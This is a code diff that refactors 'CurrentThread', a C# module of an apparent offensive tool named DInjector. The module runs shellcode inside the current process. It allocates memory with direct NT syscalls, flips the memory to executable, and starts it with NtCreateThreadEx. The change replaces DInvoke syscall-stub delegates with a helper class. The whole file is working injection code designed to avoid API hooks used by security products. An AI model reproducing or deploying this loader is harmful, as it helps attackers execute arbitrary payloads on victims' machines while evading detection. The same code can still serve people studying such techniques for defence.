@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
@@ -8,66 +7,16 @@ namespace DInjector
 {
     class CurrentThread
     {
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            IntPtr ZeroBits,
-            ref IntPtr RegionSize,
-            uint AllocationType,
-            uint Protect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            ref IntPtr RegionSize,
-            uint NewProtect,
-            out uint OldProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
-            out IntPtr threadHandle,
-            DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
-            IntPtr objectAttributes,
-            IntPtr processHandle,
-            IntPtr startAddress,
-            IntPtr parameter,
-            bool createSuspended,
-            int stackZeroBits,
-            int sizeOfStack,
-            int maximumStackSize,
-            IntPtr attributeList);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtWaitForSingleObject(
-            IntPtr ObjectHandle,
-            bool Alertable, uint Timeout);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate bool CloseHandle(IntPtr hObject);
-
-        private static bool closeHandle(IntPtr hObject)
+        public static void Execute(byte[] shellcode)
         {
-            object[] parameters = { hObject };
-            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
-        }
-
-        public static void Execute(byte[] shellcodeBytes)
-        {
-            var shellcode = shellcodeBytes;
-
             #region NtAllocateVirtualMemory (PAGE_READWRITE)
 
-            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
-            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
-
+            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
             IntPtr baseAddress = IntPtr.Zero;
             IntPtr regionSize = (IntPtr)shellcode.Length;
-            DI.Data.Native.NTSTATUS ntstatus;
 
-            ntstatus = sysNtAllocateVirtualMemory(
-                Process.GetCurrentProcess().Handle,
+            var ntstatus = Syscalls.NtAllocateVirtualMemory(
+                hProcess,
                 ref baseAddress,
                 IntPtr.Zero,
                 ref regionSize,
@@ -85,15 +34,14 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
-            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
+            uint oldProtect = 0;
 
-            ntstatus = sysNtProtectVirtualMemory(
-                Process.GetCurrentProcess().Handle,
+            ntstatus = Syscalls.NtProtectVirtualMemory(
+                hProcess,
                 ref baseAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                out uint _);
+                ref oldProtect);
 
             if (ntstatus == 0)
                 Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
@@ -104,16 +52,13 @@ namespace DInjector
 
             #region NtCreateThreadEx
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
-            NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
-
             IntPtr hThread = IntPtr.Zero;
 
-            ntstatus = sysNtCreateThreadEx(
-                out hThread,
+            ntstatus = Syscalls.NtCreateThreadEx(
+                ref hThread,
                 DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                 IntPtr.Zero,
-                Process.GetCurrentProcess().Handle,
+                hProcess,
                 baseAddress,
                 IntPtr.Zero,
                 false,
@@ -131,10 +76,7 @@ namespace DInjector
 
             #region NtWaitForSingleObject
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWaitForSingleObject");
-            NtWaitForSingleObject sysNtWaitForSingleObject = (NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWaitForSingleObject));
-
-            ntstatus = sysNtWaitForSingleObject(
+            ntstatus = Syscalls.NtWaitForSingleObject(
                 hThread,
                 false,
                 0);
@@ -146,7 +88,7 @@ namespace DInjector
 
             #endregion
 
-            closeHandle(hThread);
+            Win32.CloseHandle(hThread);
         }
     }
 }
